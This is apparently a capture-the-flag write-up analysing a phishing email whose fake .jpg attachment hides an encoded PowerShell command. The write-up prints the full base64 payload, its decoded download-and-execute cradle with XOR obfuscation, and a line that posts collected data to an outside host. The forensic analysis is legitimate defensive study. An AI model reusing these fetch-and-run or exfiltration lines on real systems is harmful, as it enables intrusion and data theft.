# NSACC Task 3 Writeup

## Prompt

With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server.

Downloads:

User's emails [emails.zip](emails.zip)

Category: Email Analysis

Points: 150

## Solve

First, we extract each email from [emails.zip](emails.zip) in order to inspect the attachments to those `.eml` files. We can examine the textual content of each email by using a text editor to check out the `.eml` file itself.

```sh
for x in *;
	do \
		mkdir "${x%%.*}"; \
		cd "${x%%.*}"; \
		mv ../$x .; \
		munpack $x; \
		cd ..; \
	done
```

This allows us to find that the file [emails/message_13/sam3.jpg](emails/message_13/sam3.jpg) is not actually a `.jpg`, actually its some form of text. That's interesting, let's examine further!

```sh
file sam3.jpg
	sam3.jpg: ASCII text, with very long lines, with no line terminators
```

Now we look at the contents and see:

```
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABoAHIAcQB0AC4AaQBuAHYAYQBsAGkAZAAvAHAAcgBlAHMAcwB1AHIAZQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADYAOAAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
```

This looks like some sort of Base64 encoded payload being decrypted, then executed with `powershell`. Decrypting the Base64 we get the following:

```ps
$bytes = (New-Object Net.WebClient).DownloadData('http://thrqt.invalid/pressure')

$prev = [byte] 68

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

This downloads a file named `pressure`, then proceeds to do a byte-wise XOR on the file before executing it with `iex`. Very interesting simple obfuscation. To find out further what this does (and solve task 3), we must find that file, and decrypt it. The first step is to extract this file from [capture.pcap](capture.pcap) from task 1. We can do this in Wireshark, using "File > Export Objects > HTTP...". This menu allows us to retrieve the file [pressure](pressure). 

From there, we write a small python script to do the chained XOR and decrypt the file ([decode.py](decode.py))

```py
key = b"D"  # 0x68 in ASCII
out = b""

# Open in Read Bytes mode
with open("pressure", "rb") as f:
    c = f.read()

    # Chained XOR
    for x in c:
        key = bytes([x ^ int.from_bytes(key, "little")])
        out += key

# Write output file
with open("pressure_decrypted.ps1", "wb") as f:
    f.write(out)
```

Now we can see that [pressure_decrypted.ps1](pressure_decrypted.ps1) is actually a PowerShell script. The URL to which the POST request is made is at the very end of the file, in this case in the line:

```ps
Invoke-WebRequest -uri http://nyvwl.invalid:8080 -Method Post -Body $global:log
```